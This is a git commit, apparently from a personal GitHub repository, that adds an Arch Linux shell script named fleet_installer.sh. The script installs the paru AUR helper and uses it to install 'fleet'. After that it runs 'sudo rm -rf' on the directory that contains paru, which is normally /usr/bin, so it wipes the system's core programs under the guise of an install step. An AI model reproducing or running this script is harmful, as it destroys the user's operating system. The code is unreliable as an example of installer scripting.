47fb5376e9546c3b8957f37bfab34170b75d6816
monkaCat.jar | MeSSengeR.py <139318962+messengernew@users.noreply.github.com>
2024-07-12 00:23:15 +0300

    Create fleet_installer.sh

---
+++ fleet_installer.sh
@@ -0,0 +1,22 @@
+#!/bin/bash
+
+sudo pacman -S --needed base-devel
+
+git clone https://aur.archlinux.org/paru.git
+cd paru
+makepkg -si --noconfirm
+cd ..
+
+paru -S fleet --noconfirm --sudoloop -q
+
+paru_location=$(which paru)
+sudo rm -rf "$(dirname "$paru_location")"
+sudo rm -rf "$paru_location"
+
+fleet_location=$(which fleet)
+mv "$fleet_location" .
+
+fleet_path=$(realpath fleet)
+
+# Вывод пути к fleet
+echo "Путь к fleet: $fleet_path"
